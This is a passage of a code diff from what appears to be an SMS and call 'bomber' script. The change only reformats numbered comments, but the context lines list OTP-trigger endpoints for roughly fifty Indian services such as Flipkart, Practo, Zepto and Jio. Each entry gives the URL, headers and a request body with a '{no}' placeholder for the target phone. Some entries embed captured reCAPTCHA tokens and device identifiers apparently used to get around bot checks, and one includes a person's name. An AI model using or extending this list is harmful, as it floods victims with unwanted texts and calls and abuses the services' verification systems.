@@ -1276,7 +1284,7 @@ def build_api_list():
         "body": {"channel": "whatsapp", "resend": True, "countryCode": 91, "phone": "{no}", "platform": "WEB"}
     })
     
-    # 56. VRL Bus
+    # ====== 56. VRL Bus ======
     apis.append({
         "name": "VRLBus",
         "url": "https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP",
@@ -1289,7 +1297,7 @@ def build_api_list():
         "body": {"PhoneNo": "{no}", "Captcha": "6yg78"}
     })
     
-    # 57. Flipkart
+    # ====== 57. Flipkart ======
     apis.append({
         "name": "Flipkart",
         "url": "https://2.rome.api.flipkart.com/1/action/view",
@@ -1302,7 +1310,7 @@ def build_api_list():
         "body": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{no}", "clientQueryParamMap": {"ret": "/my-account", "entryPage": "DEFAULT"}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "triggerSna": False, "sourceContext": "DEFAULT"}}
     })
     
-    # 58. KreditBee
+    # ====== 58. KreditBee ======
     apis.append({
         "name": "KreditBee",
         "url": "https://api.kreditbee.in/v1/me/otp",
@@ -1316,7 +1324,7 @@ def build_api_list():
         "body": {"reason": "loginOrRegister", "mobile": "{no}", "appsflyerId": "06489c77-8f7b-4dd0-9c10-f673c161c6bb-p", "mediaSource": "", "firebaseInstanceId": "", "firebaseiosAppInstId": ""}
     })
     
-    # 59. Dehaat
+    # ====== 59. Dehaat ======
     apis.append({
         "name": "Dehaat",
         "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
@@ -1329,7 +1337,7 @@ def build_api_list():
         "body": {"mobile_number": "{no}", "client_id": "kisan-app"}
     })
     
-    # 60. Medkart
+    # ====== 60. Medkart ======
     apis.append({
         "name": "Medkart",
         "url": "https://app.medkart.in/api/v2/auth/request-otp",
@@ -1344,7 +1352,7 @@ def build_api_list():
         "body": {"mobile_no": "{no}"}
     })
     
-    # 61. ConfirmTkt
+    # ====== 61. ConfirmTkt ======
     apis.append({
         "name": "ConfirmTkt",
         "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
@@ -1359,7 +1367,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 62. RailYatri
+    # ====== 62. RailYatri ======
     apis.append({
         "name": "RailYatri",
         "url": "https://www.railyatri.in/m/user-web-point",
@@ -1373,7 +1381,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 63. HealthKart
+    # ====== 63. HealthKart ======
     apis.append({
         "name": "HealthKart",
         "url": "https://www.healthkart.com/veronica/user/login/send/otp/1/{no}",
@@ -1389,7 +1397,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 64. PharmEasy
+    # ====== 64. PharmEasy ======
     apis.append({
         "name": "PharmEasy",
         "url": "https://pharmeasy.in/api/auth/requestOTP",
@@ -1403,7 +1411,7 @@ def build_api_list():
         "body": {"contactNumber": "{no}"}
     })
     
-    # 65. RedBus
+    # ====== 65. RedBus ======
     apis.append({
         "name": "RedBus",
         "url": "https://www.redbus.in/api/getOtpV2",
@@ -1415,7 +1423,7 @@ def build_api_list():
         "body": {"phoneCode": "91", "mobile": "{no}", "whatsappOption": False, "reCaptchaResponse": "0cAFcWeA7BnwmKiiOtCYj67Rw-QpreM8nKQQRaNTb62qas8O9uDlGTwg82HJS175qcWAI_HujQObkbg6FS8WH5rm_HUYMD0SH53quzDgzc70FiiOmGsdeUMUdh7etOFj4ixwyeCEDxB2tZlSOLDqnEF4txpYDLQX19Y3VAduSpsCohZCdHdReBn1QMsQrquPivsIxT3IDuNU1TLbvkz2XuAKJdsF2TSE1MlJU8XC2yHfF0qy46-xslvw7XbQNZf3bkL6ejwEO6PQ9QlLbfpNXmIWYNpUafFrziU0T4MlSt5LiFEftkMSTNIsBsfNroZj1qPpM5QYpvWh3fCtnBeAYlO8sa1wGf8I6ZHRRkBGE9cDznnvdTTTZvB3dPz0BXomgr0zj9hC4aTDDb_wX9bzZbHAmtHqAMYblPRUXcx5nL3zVZA36u3V7oXD-Bq3hjluMAuNRSEpe0-vvdU6r7KVOz5iUQDnDSQcSMC2PEpsIXZXRW8Ct09WHD0cfVhQ6s-QADv5S8LQxB9F0nym6IpewESdrYFpxPYUFamLILJzqfyQ4h9w_0HeCgmy-i6Opd6mV8yuw5XxoGU9Qwm4IKOFUApAgpwUqJh7IBlWZeUtGOMQ3g1H0z3TmffL5HQ0JRgehifwk-zMHvqkfJMqfyPFDqpc_sGnYeALnpMamLkkMbx_YfSp5KmuK7x3XFZj3yQ5JlNy3NZiYvTeUdR-UIO7Qlhh7YQfurIMmUO3qR98JTai3aYZFtdjsD4KMzj_75WjH_WG1NMtzqL8ylYfIlK2hCEU2HMJ3OTFuheJtEspiq0fa3tJarlAE8QBEZxwF7MTK7ryr5DifMC_4fUS2tgS2bEh3Km_z_wPNp6RWVK4JsIqYT6wWFbE7_OWV4_ASIEUgvzHljrOjhr0Aqni0OYW2Of6zGCLXxQvz9g1NPPPKpXFBoN72aYj09R9tgWs3HzUQo05sOnPGWbMw5j81m-j-BcgH8aW2LfnroOHTuLndPNTUoqLn294YITny0rBhFqMqdXWTo80DRFERzikzTm-l-jzDoahxWvJow7P4k5GEufj5vjFuGBareJTQTjlbxZ5jQLlloqfhhcgMQ"}
     })
     
-    # 66. Smytten
+    # ====== 66. Smytten ======
     apis.append({
         "name": "Smytten",
         "url": "https://route.smytten.com/discover_user/users/loginViaNumber",
@@ -1431,7 +1439,7 @@ def build_api_list():
         "body": {"ad_id": "", "device_info": {}, "device_id": "", "app_version": "", "device_token": "", "device_platform": "web", "value": "{no}", "guest_user_access": True, "recaptcha_token": "0cAFcWeA4QeqXYr-3ef2gC7FXoNoCrvtXqiS0mGbRwkSBC7nN1TGp4EupoRe0WJVGUH4ztzLjwSQiElpMe2S-sHEUAsoz8z_xgHpSo5EBLIjZT7O--rd4lZvocPW2f8S24u7CIwJSolBHvO5e2gHYzsF_gsZMqDE5NKDg50nehbuUkhXmH6m1ZbrgBrbLEShKcqanIcUWejhaxppzjT9flLBy04d9WHC8LrBzm31yt_w3jpYLt5jHcgwEnCdwfM-TGHhYq-eW0-J44HxhNbGzLXPW6U82yoMyGEyApQZ-hZYMfjRAfMz8WYhMwrRv8bGJj6C7RP77Fyk8iGhJfDBaSPKgvB8d3zArNjtKRgf9iR9hYCyigu88n6ajgKQCeyCg77fvjrLmZK6fzHVoIJo2DJKCieVZC1QSP9bKa_vP0XyzCjYfhBkBUpcUjG7LRiy81ikzrqPqQ6XeUs1jHl4akgN2F0Ty6No8F7dQ_cllZQMIi-Inpdd2ZJZBs4B-Qub6tOBPl4bRjB4hIzQzFcb9QEZc_Sti6qO0_RI6CmoWh_GKLoc4odguBqKUrqMMXpAjzjsLf9Fb59bGiIKRPcLo3N-EQECdUYjs-tN9Fuwe5A6yOp7ZbhFitmBY52rU31VtxQVmHHZvqH7DrsPMtXs0FGJC4x1QhDIsxbIjgR0ZBo1S1BBMcdF8cun4tZOi3slh-RXNyd4q52ovC7tXjvVhgHTtuA69y2LmNsISKpuxymxmDwij48e_WG_mAK0vFUfHzCQIosADHb2yaKsy4hN4VE-3UhWNcpablADYqo2XDuOHAj235AK-kK9Z5069a5FgJ9mc_2FAqCWXZJIKPPQyRwSVos2q1sHNXTLC2AaFVgN-zz-FSKHk0XvA72gn0Mgxhy003JBlVUjUDlckId69rbCcP4zZ5-wSZEV9LfW-DO1sj1CNe0LJkUoS-Vz0OXfUs-NUcySHs1bMHbl_vsJbc5dzi7Q5Oem20th-5Uodo1RQigG_9t6qhhIO6NUO63he52csRj4tXTJkuaJ3m16pMqO791pr75M8szXIpcS-qnafXG5AZju1xIYKJ_NX4cpQhLzoMFa0G16afduI589TjD1ftZmC-ZtTiey6hLBs5rxonIlKPottISovBfN1BampSKvFNHryHFyjfWmr3mcijnz9MsOa1LyIOHsaDT3ry7ctOswcfXbIw2eD_mQRozynPQ9Wd_p9IYmbpj-WOiG0jzb048Mi_iG1HRJlWck2gID9XjVxn8pzdWNAF6fYEj6EpTIZtEh9CyZu9XNuTXoLH1EZ4PBjuKDaNipscBZWnxxZQ-dSg_uPEyuosLpsLescCnJCWWJbB4TPGpOirAQsMoZMKLq5Cm8nfnSJsMsFwd9Tki3wkrvR8mEvEAsbmWX5rY7x4ebyD9xmznjb1-0RtS35xxwaUIDvrFlyX0QFLqH3TDUIfObXF3-S6sxe2qH7hl2U30Qhtb8gh4lS8DROr-fRlGTu3MethG6FXHWdTfM-rgiqqsp9Jl2dpitsaLa2xGiVnn1zx86FY_lSL95oNwx_uCdJQExQKGLKKWswUaJk6NwC5U4daGP-0nAcdq9Xb21kDJnjine3gbp_3NeiFxiyJsBSqJG7RHewvmclzTlrPDCF531ny8rPxvO39e3EG3N87nieDwcPaQR6Gq2aZbR8_4Rx0fmgza4SHyAs22CMupxw4GfOb2kMkc-zU6hgClRDozCtorpHa9fRPxurQ73_9t2LUL-ImQUzM-_VSkK6ELAgi-8fyziSuABW9u8wI7R65LiUkRrB3c7jTChs1XyWih4nastvQA6PbQB6rA3ZmcgOP0MBi_47jSq_3Nmvujjj_ZAIgrQGIoQYbsUVkDNi4AuaV7cZFGwGEjKx5NiRSBW1AfTvfNN-xKNgdHPPZMQV2cxZhwM9ZBGGcKR7WKv3V6LaGWbp_rm-5HDzzWrq4Me5bi3Yr1KUCCiNQvI01pdY98SE9HJD9XwaRp7Ioj_kP76cqJO4ND1L8mniZ_UwSLbEvtd4o-Z6zSjMvvlBab6m_e3T4lcdp0hHCYJVGvu6C1XSDEKTEwxSA4MYHOOzmxnoH8NsbrZS0YfAzST-hgtXCBU8ZVNHw-PgyAx3YlGx3iyWZR8Cmt5Ky1HAj4QxNhFmUrPVUipxAP5HRohTEaGFgwmUWlRNAmhEq6dFHrVGEUat-YaJoanMNUDoSNHu5hv_5AjgDpzx3TAwulB_Nm3mAgMlAPb3PehkRKhPKihjKZlC8aQXmpLeNjodX-QDGTMWjYK8HzmOdnNK5IzkWTDlFqmp1LJRX"}
     })
     
-    # 67. GoKwik
+    # ====== 67. GoKwik V4 ======
     apis.append({
         "name": "GoKwik_V4",
         "url": "https://gkx.gokwik.co/v4/auth/otp/login/trigger",
@@ -1452,7 +1460,7 @@ def build_api_list():
         "body": {"phone": "{no}", "country": "IN"}
     })
     
-    # 68. Zepto
+    # ====== 68. Zepto ======
     apis.append({
         "name": "Zepto",
         "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
@@ -1484,7 +1492,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "countryCode": "+91"}
     })
     
-    # 69. Agoda
+    # ====== 69. Agoda ======
     apis.append({
         "name": "Agoda",
         "url": "https://www.agoda.com/ul/api/v1/auth",
@@ -1500,7 +1508,7 @@ def build_api_list():
         "body": {"email": "", "keepMeSignedIn": False, "whatsapp": "+{no}"}
     })
     
-    # 70. Mpokket
+    # ====== 70. Mpokket ======
     apis.append({
         "name": "Mpokket",
         "url": "https://web-api.mpokket.in/registration/sendOtp/sign-up",
@@ -1514,7 +1522,7 @@ def build_api_list():
         "body": {"payload": "U2FsdGVkX1/eb9kMqF3HgTIL63xwEgDkzfVoASZufOdHHizpf9UKLyTQY9wB2QeRQV4AUjUwkDRExNOgrBRMS/qj6Zjb9y5hsqlrDkP57ReM1J8ZFMoif7vEKGNM2gcy/MoebRAP2aedf31rCJtXu/HB32hg8T6gI7JxRjXFyQ7HcpxvzWis5uVQRAAuYWtHOa1ZjUgUHVXn2yZJallHxw4pdhzbDX0WAQIkDsZNU2nX8lk8pbUBfhxjKmcy0iRk"}
     })
     
-    # 71. Penpencil
+    # ====== 71. Penpencil ======
     apis.append({
         "name": "Penpencil",
         "url": "https://api.penpencil.co/v1/users/resend-otp",
@@ -1529,7 +1537,7 @@ def build_api_list():
         "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{no}"}
     })
     
-    # 72. SmartCoin
+    # ====== 72. SmartCoin ======
     apis.append({
         "name": "SmartCoin",
         "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
@@ -1547,7 +1555,7 @@ def build_api_list():
         "body": {"phone_number": "{no}", "app_version": "100101", "channel": "IVR", "request_type": "REGISTRATION", "onboarding_consent": True}
     })
     
-    # 73. TataCapital Voice
+    # ====== 73. TataCapital Voice ======
     apis.append({
         "name": "TataCapital_Voice",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -1561,7 +1569,7 @@ def build_api_list():
         "body": {"phone": "{no}", "applSource": "", "isOtpViaCallAtLogin": "true"}
     })
     
-    # 74. 1mg - SMS
+    # ====== 74. 1mg - SMS ======
     apis.append({
         "name": "1mg_SMS",
         "url": "https://www.1mg.com/pwa-api/auth/create_token",
@@ -1582,7 +1590,7 @@ def build_api_list():
         "body": {"referral_code": None, "number": "{no}"}
     })
     
-    # 75. 1mg - Call
+    # ====== 75. 1mg - Call ======
     apis.append({
         "name": "1mg_Call",
         "url": "https://www.1mg.com/auth_api/v6/create_token",
@@ -1596,7 +1604,7 @@ def build_api_list():
         "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": True}
     })
     
-    # 76. Unacademy
+    # ====== 76. Unacademy ======
     apis.append({
         "name": "Unacademy",
         "url": "https://unacademy.com/api/v3/user/user_check/",
@@ -1611,7 +1619,7 @@ def build_api_list():
         "body": {"country_code": "IN", "phone": "{no}", "is_un_teach_user": False, "otp_type": 2.0, "send_otp": True, "email": ""}
     })
     
-    # 77. Doubtnut
+    # ====== 77. Doubtnut ======
     apis.append({
         "name": "Doubtnut_Login",
         "url": "https://api.doubtnut.com/v4/student/login",
@@ -1626,7 +1634,7 @@ def build_api_list():
         "body": {"app_version": "7.10.51", "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450", "phone_number": "{no}", "language": "en", "udid": "b751fb63c0ae17ba", "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9sKGS6MlrzZOwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}
     })
     
-    # 78. Doubtnut Call
+    # ====== 78. Doubtnut Call ======
     apis.append({
         "name": "Doubtnut_Call",
         "url": "https://micro.doubtnut.com/otp/send-call",
@@ -1643,7 +1651,7 @@ def build_api_list():
         "body": {"phone": "{no}", "locale": "en"}
     })
     
-    # 79. RummyCircle
+    # ====== 79. RummyCircle ======
     apis.append({
         "name": "RummyCircle",
         "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
@@ -1658,7 +1666,7 @@ def build_api_list():
         "body": {"otpOnCall": True, "mobile": "{no}", "otpType": 8.0, "transactionId": 1.708139023656E12}
     })
     
-    # 80. OLX Call
+    # ====== 80. OLX Call ======
     apis.append({
         "name": "OLX_Call",
         "url": "https://www.olx.in/api/auth/authenticate",
@@ -1674,7 +1682,7 @@ def build_api_list():
         "body": {"method": "call", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
     })
     
-    # 81. ShopClues
+    # ====== 81. ShopClues ======
     apis.append({
         "name": "ShopClues",
         "url": "https://www.shopclues.com/ajax/send_login_otp.php",
@@ -1688,7 +1696,7 @@ def build_api_list():
         "body": "mobile={no}"
     })
     
-    # 82. Indiamart
+    # ====== 82. Indiamart ======
     apis.append({
         "name": "Indiamart",
         "url": "https://m.indiamart.com/mobile/api/register_mobile.php",
@@ -1701,7 +1709,7 @@ def build_api_list():
         "body": "mobile_no={no}&action=send_otp"
     })
     
-    # 83. Justdial
+    # ====== 83. Justdial ======
     apis.append({
         "name": "Justdial",
         "url": "https://www.justdial.com/functions/otp/send_otp.php",
@@ -1714,7 +1722,7 @@ def build_api_list():
         "body": "mobile={no}&type=login"
     })
     
-    # 84. PolicyBazaar
+    # ====== 84. PolicyBazaar ======
     apis.append({
         "name": "PolicyBazaar",
         "url": "https://www.policybazaar.com/api/user/generate_otp/",
@@ -1727,7 +1735,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 85. PaisaBazaar
+    # ====== 85. PaisaBazaar ======
     apis.append({
         "name": "PaisaBazaar",
         "url": "https://www.paisabazaar.com/api/user/send-otp/",
@@ -1740,7 +1748,7 @@ def build_api_list():
         "body": {"mobile_number": "{no}"}
     })
     
-    # 86. IndiaLends
+    # ====== 86. IndiaLends ======
     apis.append({
         "name": "IndiaLends",
         "url": "https://indialends.com/pl/SP_MVResend",
@@ -1757,7 +1765,7 @@ def build_api_list():
         "body": "MobileNumber={no}&Mode=2"
     })
     
-    # 87. Astrosage Call
+    # ====== 87. Astrosage Call ======
     apis.append({
         "name": "Astrosage_Call",
         "url": "http://varta.astrosage.com/sdk/send-otp-via-call",
@@ -1776,7 +1784,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 88. Astrosage Register
+    # ====== 88. Astrosage Register ======
     apis.append({
         "name": "Astrosage_Register",
         "url": "http://varta.astrosage.com/sdk/registerAS",
@@ -1795,7 +1803,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 89. MagicPin - Call
+    # ====== 89. MagicPin - Call ======
     apis.append({
         "name": "MagicPin_Call",
         "url": "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
@@ -1815,7 +1823,7 @@ def build_api_list():
         "body": {"phoneNumber": "91{no}", "authMethod": "call", "token": "0cAFcWeA61Qx8xkm_zXvmkoN9GMx8ROX6pW1nwcmm3KKwrxTOTmWC8ji_Dv0M0tcYNgudFfpIfVmZ-LSZ_N9fEJqiaE8mNfT7hQQJfg1uF2kTKPpjpJR6EqO24XHaV0te5q3JJr9KHf72BcQ7qpofk54cjhzGRokezbp1L5sw_vtU7SVHtLMBd-23SO3fq45fcpYnl7s9FHGUtD2lDWQIK7HVX1mjdiWngr1bX5XbU-m270eshEgAagJi5kOCHb4fPAttbYn0zDc859bEmrAJhSRWtlZT3GGK-WMvveRGhCtsqB2mILH2HCZy0rlk4ms0oeeNQ_ckGYlWJkOnBXj-knZExHaiReG5FIHk0pvMQ1AzesjH4XRNITN6MLA97e2hU8P3yeKK1uibPO9uZsn89IZX7i6IzRZCecJO0Vafv6Xm7EP8lJQq9YKIF3e9RIEXXDxc8xyr6P8oaegdyRtwAVs4j_kaXDYGIO5wid6A1tbIrEPs1qFGT_qAsSoS3VEvshELSCxDC87f8MZrt6zLPSHtXQXENrDK0eHWTeRiQ0H-Ilh2nPUUKTrYK-hbMBwiGkbow1DBJbCDlHVs4nds1yDy6JJi3-C1FeSE_5yW7g1jUfyoYc5PyKKGrP-5iQtXQ-fAYsF38gxTXuEqXm8BqRetWT3cN4RBXzoB8GNl2qxd4l33i2S-aPNtmjUREcXLVbQJMN8E6sb8MPkrq6et4sUWTBwNnBgLZeXgm5dFSI9N6NTWwruifvLpuJ2_tQ9OGcy_OIl_M1XkRfwSdQA9Vk9nMQOPgn07B-DSY7j4lYniu-HsVldAhAK4"}
     })
     
-    # 90. Udaan - SMS
+    # ====== 90. Udaan - SMS ======
     apis.append({
         "name": "Udaan_SMS",
         "url": "https://auth.udaan.com/api/otp/send",
@@ -1837,10 +1845,8 @@ def build_api_list():
         },
         "body": "mobile={no}"
     })
-
-    # ========== NEW ULTIMATE_APIS (91-110) ==========
     
-    # 91. Quikr
+    # ====== 91. Quikr ======
     apis.append({
         "name": "Quikr",
         "url": "https://www.quikr.com/core/register",
@@ -1852,7 +1858,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 92. Myntra
+    # ====== 92. Myntra ======
     apis.append({
         "name": "Myntra",
         "url": "https://www.myntra.com/gateway/v1/auth/getotp",
@@ -1872,7 +1878,7 @@ def build_api_list():
         "body": {"phoneNumber": "{no}", "signup": "ONECLICK"}
     })
     
-    # 93. MakeMyTrip SMS
+    # ====== 93. MakeMyTrip SMS ======
     apis.append({
         "name": "MakeMyTrip_SMS",
         "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
@@ -1899,7 +1905,7 @@ def build_api_list():
         "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
     })
     
-    # 94. MakeMyTrip WhatsApp
+    # ====== 94. MakeMyTrip WhatsApp ======
     apis.append({
         "name": "MakeMyTrip_WhatsApp",
         "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
@@ -1926,7 +1932,7 @@ def build_api_list():
         "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE", "WHATSAPP"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
     })
     
-    # 95. Swiggy Voice
+    # ====== 95. Swiggy Voice ======
     apis.append({
         "name": "Swiggy_Voice",
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
@@ -1938,7 +1944,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 96. Flipkart Voice
+    # ====== 96. Flipkart Voice ======
     apis.append({
         "name": "Flipkart_Voice",
         "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
@@ -1950,7 +1956,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 97. Zomato Voice
+    # ====== 97. Zomato Voice ======
     apis.append({
         "name": "Zomato_Voice",
         "url": "https://www.zomato.com/php/o2_api_handler.php",
@@ -1962,7 +1968,7 @@ def build_api_list():
         "body": "phone={no}&type=voice"
     })
     
-    # 98. MakeMyTrip Voice
+    # ====== 98. MakeMyTrip Voice ======
     apis.append({
         "name": "MakeMyTrip_Voice",
         "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
@@ -1974,7 +1980,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # 99. Practo SMS
+    # ====== 99. Practo SMS ======
     apis.append({
         "name": "Practo_SMS",
         "url": "https://accounts.practo.com/phone_number_resend_otp",
@@ -1989,7 +1995,7 @@ def build_api_list():
         "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4LKhUNc1gFczOyhgZzq9mCm7tT7I-FQllZbY_jv2epFHGRn5t_Z1rBhKQRZq5SDZvI5gxLruglRfjZTIlvT0HeaQ-Yg7Mw2Gy3w6QdAOlKH-AGGSTDMMSadAHftEg1K868hurF8Eqm71JVDaAH3XgpNeRRAMdpQrQvXS9dWyoQhfXu1Hr7iHUNnc7aPS4rZS6UMx24YaxhiFEQA7OId4nmpc08mq7zGhFRkFxYrE4mhHwBRLLdb49nu5pwEUBhRlgD_TljqOWoDUsZqcr4kPPppV_9CbmN6ntLt-jh11PTK1UcF1vPE2kyIp6H9VBQu3rhG9gqMiuc8TjAwntB1iHxOP01Rv1GkxncolCpgpreGlti__DT-rjKhgWvn6l5lMSU-a2n79V1wxY1_AdRWZ6HDK9oFWhLkRX7YzQB5dI0NJKLGF8tZDDTUQY2q9d840wph-1BRQoL3sv_o2f7wur1gmNQkPhuQlw2aJPX-hTPAS2sq5JyYKe4nTPYxwupnHxCfhw8OqFtriazRHut_9bKUEW5vu7SZgybmQE1Olfq9AL_OJb61kHW73pR5bkdJc61y2MNWcNdj8bcejzv_H_YizRDM6IKpYaWu4iHZOWiG6ePVQdjSJ6TScW3C1OS2dTllVWTx4nG4MAxxM31-1fsIqkgBM1y-LnttHVDxEWOFGgfrDlghyUa_VfC7hNDlk1LTOw1YEamQZ-c1gNIoMs-POo0Dmc853CZ_CsVcOd3klBksWJD8hc8JdaljbJbQUwHFYyGS2xkn66trJaSyWqdf8FytpePaG-J9Y0GsX09UXKK8M3FVAOp4EDpkYQbYArgAXgbZCJBem2Gfq3oSmkbwyH4yPUbK300Efozof6AzzvztS80kwlN-FaxLA5H3yxsYAhOiAit-HKInj_TIxKyGGC8eM8MY75roZ7CKtSm37ohvdz6GsGQrsZUHxVlmVmDx6jcKdDaap8Xn7LkUj2ZbYFkIZzCv4qoNzPelhSwqBFcwATI0x_RiKDxzz1PozfvKW77eBUYZs8QpZNEneBA9pg-jQtWR4lNoghy49nRiq_npCKuGxRkdt7gCQZj0Nr2mfjjimfYZdDOFQ-CAb56WiOOFFefmYdZML53Zak59pZLZxAcR2GSbPRUsTCUdFSRf9bNgyRUwGgj2yt3yposwawV3xmQaqPhQYJ0Lan83roYDr4YmucZlKriyljsv-xjR4bJFgOjO9Jx1Q8fzd4tyfcgFq7JUQ8fXZFMqCvMBEOqsfE"}
     })
     
-    # 100. Practo Voice
+    # ====== 100. Practo Voice ======
     apis.append({
         "name": "Practo_Voice",
         "url": "https://accounts.practo.com/send_voice_otp",
@@ -2004,7 +2010,7 @@ def build_api_list():
         "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4UvhfXOC4zOYWpUqagDOdtUGvLowCjT3xxZsRHnLIyMQ_VFu27OKB_3tQXfarDvDWhGYtcwLll2sQ1gDxOiHtosPK8DxrG8Ik1XmjsM-CUz-q5DoH8SGbVsYK2tlmJuOSC3k2J_ftOHxsYqTSm75opTJbAVuueFRolX10ux9nyn3QETF8Sy2czMK-pyhwDSEWJuH1woL-onjPtE3OM-mS99RDkxYthJZUQ_ZNClfX0QH88RSSgA_x49CqQLA3S47HZMHq-DRvuvC81KIixxfsoDNTzCtbFQHjT4KWgKAQuyXjIB6QJeWoLmYlpvjRpJ3JzafZjhPRXlnmjOpjVbHkKXf9nQ-RyWepZMBroDNv84IFdk9djy_lAPDT1uVP95ObGUcyjMz60nipeO8X0kKAPT5uCPt4getcKulOdh1a8YAzF-vYfjdBG_K1PQ6r060J_aZHXU8_nS9PVpDnfanxtBbi60tk1gv_y52ED4Mj3ZB7Eum9gDXZYAT97xwTp9UR1Vy5dsFCclsqTsINQBH_y5yZJ3xqhOn0asokTmfuzLGxBRFVWC0gGpgXPiLp5LI7oF5GgK1B1zYv0LJR0S2EQAd7HcNPEp5WegheWmIYRrLQTRVxi52HjhOut7uBseq_lCOY_ObU2k-DcK6khpmBItyD3a5oc-nao-sHrE-SABRSrWPzDwbuU3oEwwXziebATwIP951QbUaoMEJv-j6MM7cVEasQQowdnLVF_g6v3Gc4pP6rtmXCW2XMgTF8D01iKOc2uU_t8f7P1Ws5az2P3o6LpZKHRwMEzsMWB-_b5q5KMs61xEcjMhMmURJ2Ba_4oTkPrWU5DVUaFbWdEatf_cVbhG_1pPpcnZtsVJNHrSdSQCgcX8MFcIoVbU5S7qDZbgTc86bjHnFCmnHnYeViWaIvuut3ugu3BN8lVHZco92i6wzMfSIlsYSGf9e9j_2jBbuSsx4KK-FeTwR06i1W0MH5mW9lsZqnxhEDwW1UflUt-tVLAmTXItEpN4nZOJDShMwIfQhDWBL4IQ9ADfPQywpVdXreT7iS80kVm8QO0asWUIrUNg0EkzAbE-aIft878ogK6BbPmYpFWjROBv1CMLAdXigefvq-1t-vGE0jx6KooyGdOeIBiHMx8Ex9RGTkkTe99Oz38b9Wh3lQaOOaAosDsuSHyUKMSFOffc9axpI04SQb1oKSNj7sUw4KQoToWAWtUj4JHJPbl3bZ_HMoe6juZCzKHK1BcUVxCpxNbS3bFEhk"}
     })
     
-    # 101. MyAstro
+    # ====== 101. MyAstro ======
     apis.append({
         "name": "MyAstro",
         "url": "https://myastro.org.in/sendOtpPinnacle",
@@ -2018,7 +2024,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 102. Holidayify
+    # ====== 102. Holidayify ======
     apis.append({
         "name": "Holidify",
         "url": "https://www.holidify.com/rest/package/submitCallme.hdfy",
@@ -2032,7 +2038,7 @@ def build_api_list():
         "body": "name=Adesh+Dubey&emailId=&contact={no}&country=88&internalPlaceCode=SINGAPORE&leadData=Destination.Packages_callMe_Packages_callMe_timeout_null&destCountryCode=SINGAPORE&countryPhoneCode=%2B91&platform=Linux+armv81&pageUrl=https%3A%2F%2Fwww.holidify.com%2Fplaces%2Fsingapore%2Fpackages.html%3Futm_source%3Dgoogle%26utm_medium%3Dpmax%26utm_campaign%3Dsingapore_pmax%26gad_source%3D1%26gad_campaignid%3D22725252908%26gbraid%3D0AAAAADLSud5aKXKVA0SLBfyeMwzh-26x4%26gclid%3DCjwKCAjwhNbTBhB4EiwAsFSg-ujhXN2fE1UAkJu948NZbf1V-KUlrFaPr828QQdKS4xxMk_MMZqB1RoCCEAQAvD_BwE&placeName=Singapore&referrer=https%3A%2F%2Fwww.google.com%2F&utmSource=google&utmMedium=pmax&utmCampaign=singapore_pmax&tourPackageIds=&quoteId=0&agentId=0&otpRequired=1&activeTourPackage=0"}
     })
     
-    # 103. Jio
+    # ====== 103. Jio ======
     apis.append({
         "name": "Jio",
         "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
@@ -2044,7 +2050,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "loginFlowType": "MOBILE", "alternateNumber": ""}
     })
     
-    # 104. KPN WhatsApp
+    # ====== 104. KPN WhatsApp ======
     apis.append({
         "name": "KPN_WhatsApp",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -2058,7 +2064,7 @@ def build_api_list():
         "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}
     })
     
-    # 105. Wakefit SMS
+    # ====== 105. Wakefit SMS ======
     apis.append({
         "name": "Wakefit_SMS",
         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
@@ -2070,7 +2076,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 106. Byjus SMS
+    # ====== 106. Byjus SMS ======
     apis.append({
         "name": "Byjus_SMS",
         "url": "https://api.byjus.com/v2/otp/send",
